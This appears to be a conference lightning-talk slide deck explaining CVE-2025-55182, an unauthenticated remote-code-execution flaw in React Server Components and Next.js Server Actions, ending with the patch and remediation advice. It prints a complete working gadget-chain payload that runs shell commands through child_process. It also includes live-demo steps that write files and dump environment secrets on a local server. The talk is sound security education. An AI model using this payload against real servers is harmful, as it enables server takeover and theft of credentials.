---
title: React2Shell RCE Vulnerability
sub_title:  CVE-2025-55182
event: Vehikl Lightning Talks
date: 02-27-2026
author: Cole Foster
theme:
  name: catppuccin-mocha
options:
  end_slide_shorthand: true
---

Intro
===
# CVE-2025-55182 — **React2Shell**
### Unauthenticated RCE via Next.js Server Actions

```
Affects:   react-server-dom-webpack,           19.0, 19.1.0, 19.1.1, 19.2.0  
           react-server-dom-parcel, 
           react-server-dom-turbopack
        
           Next.js                             16.0.0 – 16.0.6
            
Vector:    Unauthenticated HTTP POST 
CVSS:      10.0 - Critical
Impact:    Full server-side code execution
```

---

JS Fundamentals: constructor chaining
===
## Every object leads to `Function`

Every JS object has a `.constructor` — the class that made it.
Every class is a function. Every function's constructor is `Function`.

```javascript +exec
const obj = {}
console.log('obj.constructor.name:             ', obj.constructor.name)
console.log('obj.constructor.constructor.name: ', obj.constructor.constructor.name)
console.log('Are they the same?                ', obj.constructor.constructor === Function)
```

<!-- pause -->

`Function` takes a **string** and returns an executable function — it's `eval`:

```javascript +exec
const F = {}.constructor.constructor
console.log( F('return 1 + 1')() )
console.log( F('return process.version')() )
```

<!-- pause -->

**Two property hops from any object → dynamic code execution.**
This is normal JavaScript. The exploit just needs a way to walk those hops.

---

JS Fundamentals: thenables
===
## Duck-typed Promises

JavaScript's `await` doesn't check `instanceof Promise`.
If an object has a `.then` method, the runtime calls it automatically:

```bash +exec
node -e "
const sneaky = {
  then: function(resolve) {
    console.log('  .then() was called automatically!')
    resolve('done')
  }
}

Promise.resolve(sneaky).then(function(v) {
  console.log('  resolved:', v)
})
"
```

<!-- pause -->

**If you control `.then` on an object, you control what `await` does.**

These two JS features — constructor chaining and thenables — are the
weapons. Now let's look at the lock they pick.

---

Context: Server Actions
===
## Server Actions

Next.js Server Actions let you define server-side functions callable
directly from the browser — no API route needed.

```typescript
"use server"
async function submitOrder(item: string, qty: number) {
  await db.insert({ item, qty })
  return { ok: true }
}
```

```tsx
<form action={submitOrder}>…</form>
```

<!-- pause -->

On submit, the browser POSTs to **the page URL** (any route).
Next.js picks the right function via an ID in the `Next-Action` header.

The arguments are serialized in React's **Flight** format.

---

Context: RSC Flight protocol
===
## The RSC Flight Wire Format

The POST carries two special headers:

```
Next-Action: <sha256-hash>    ←  which function to call
Content-Type: multipart/form-data    
```

<!-- pause -->

The body is **RSC Flight** — a chunk protocol that encodes object graphs
using numbered fields and `$`-prefixed cross-references:

```
Field "0":  ["$1"]                                        ← arg list, ref to chunk 1
Field "1":  {"object":"company","name":"$2:companyName"}  ← ref chunk 2, key "companyName"
Field "2":  {"companyName":"Vehikl"}                      ← concrete value
```

Resolves to: `[{object: "company", name: "Vehikl"}]`

<!-- pause -->

The decoder resolves `$`-references by doing **bracket-notation property access**
on the target chunk: `chunk[key]`. No validation that `key` is an own property.

That's the bug. `$1:constructor:constructor` walks the prototype chain.

---

## Live — Normal Request

`normal-request.hurl`

```bash +exec
cat normal-request.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --no-color \
     normal-request.hurl 2>&1
```

_400/404 expected — the action hash is fake, and the server rejected it._

---

The Gadget Chain
===
## The Payload — Two Fields, Full RCE

```json
Field "0": {
  "then":      "$1:__proto__:then",
  "status":    "resolved_model",
  "reason":    -1,
  "value":     "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix":   "process.mainModule.require('child_process').execSync('id');//",
    "_formData": { "get": "$1:constructor:constructor" }
  }
}

Field "1": "$@0"
```

<!-- pause -->

Field "1" is `"$@0"` — a self-reference back to chunk 0.
This gives the decoder a concrete object to traverse the prototype chain *of*.

Field "0" mimics the shape of React's internal `Chunk` object.
Let's walk through each key.

---

## Step 1 — Steal `.then` to become a thenable

```json
"then": "$1:__proto__:then"
```

The decoder resolves `$1` (chunk 1 = chunk 0's object), then walks:
`obj["__proto__"]["then"]` → `Chunk.prototype.then`

Now chunk 0's object has a real `.then` method.
When the decoder `await`s it → `.then()` fires.

<!-- pause -->

## Step 2 — Trick `.then()` into initializing us

```json
"status": "resolved_model"
```

`Chunk.prototype.then` checks `this.status`.
It sees `"resolved_model"` → calls `initializeModelChunk(this)`.

This parses `this.value` using `this._response` — both attacker-controlled.

---

## Step 3 — Hijack the response object

```json
"_response": {
  "_prefix":   "process.mainModule.require('child_process').execSync('id');//",
  "_formData": { "get": "$1:constructor:constructor" }
}
```

`initializeModelChunk` reads `this._response` — normally a trusted internal object.
Here it's our fake, where:

- `_formData.get` resolves via constructor chaining → **`Function`**
- `_prefix` holds the **malicious code** string

<!-- pause -->

## Step 4 — Trigger execution via `$B`

```json
"value": "{\"then\":\"$B0\"}"
```

`$B` tells the decoder to handle a Blob. The Blob handler calls:

```
response._formData.get(response._prefix + 0)
→ Function("process.mainModule.require('child_process').execSync('id');//0")
```

The `//` comments out the trailing `0`. The function executes. **RCE.**

---

## `process.mainModule.require`

Next.js compiles server code as ES Modules where bare `require()` is undefined.
But `process.mainModule` is the CommonJS entry that bootstrapped Node:

```bash +exec
node -e "
console.log('typeof require:                       ', typeof require)
console.log('typeof process.mainModule.require:    ', typeof process.mainModule.require)

const { execSync } = process.mainModule.require('child_process')
console.log('execSync available:', typeof execSync)
"
```

_Works in any Node.js process regardless of how the module was loaded._

---

## Attack Surface

This runs on **any route**. Setting `Next-Action: anything` (even nonsense)
triggers the deserialization path. The decoder runs **before**:

- Action ID validation
- Middleware
- Authentication

<!-- pause -->

A single POST to `/` with a fake `Next-Action` header is enough.
No account. No CSRF token. No knowledge of the app.

---

Live Demo
===

## Live — Step 1: Probe

Confirm the target is running Next.js.

```bash +exec
cat exploit-1-probe.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --no-color \
     exploit-1-probe.hurl 2>&1
```

---

## Live — Step 2: RCE — Write a file

Write `id` output to `/tmp/pwned.txt` — executed **during deserialization**.

```bash +exec
cat exploit-2-rce.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --max-time 10 \
     --no-color \
     exploit-2-rce.hurl 2>&1
```

_500 "action not found" — but `decodeReply()` already ran. The file is written._

---

## Live — Step 3: Env Dump

Dump `process.env` to `/tmp/env_dump.json` —
`DATABASE_URL`, `JWT_SECRET`, `AWS_SECRET_ACCESS_KEY`, everything.

```bash +exec
cat exploit-3-env-dump.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --max-time 10 \
     --no-color \
     exploit-3-env-dump.hurl 2>&1
```

---

The Patch
===
## What Changed

Three fixes — any one alone would break the chain.

<!-- pause -->

**1. Own-property check on reference traversal**

```javascript
// BEFORE — walks prototype chain
parentObject = parentObject[path[key]];

// AFTER — blocks inherited properties
if (!Object.prototype.hasOwnProperty.call(parentObject, path[key])) {
  throw new Error('Invalid reference');
}
parentObject = parentObject[path[key]];
```

`$1:constructor:constructor` no longer works — `"constructor"` isn't an own property.

<!-- pause -->

**2. Symbol-based response lookup**

```javascript
// BEFORE — reads from the chunk object directly
value = reviveModel(chunk._response, ...);

// AFTER — uses a Symbol (unforgeable via JSON)
const response = chunk.reason[RESPONSE_SYMBOL];
```

Fake chunks can never provide a fake `_response`.

<!-- pause -->

**3. Type validation on listeners**

Before calling `.then()`, React now checks that listeners are actual functions.

---

Summary
===
## Summary

**3 requests. No auth. No account. No knowledge of the target app.**

<!-- pause -->

**Root cause** — the Flight decoder actively constructs objects from untrusted input:

- Bracket-notation property access walks the prototype chain unchecked
- Thenables auto-call `.then()` — duck-typed Promise resolution
- `constructor.constructor === Function` — every object, always
- `Function(string)` is eval — no imports, no setup

<!-- pause -->

**Remediation**

- ✅  Upgrade to **Next.js ≥ 16.0.7** / **React ≥ 19.1.0**
- ✅  WAF: block multipart POSTs containing `__proto__` or `constructor:constructor`
- ✅  Runtime: deny `process.mainModule` access in server action context
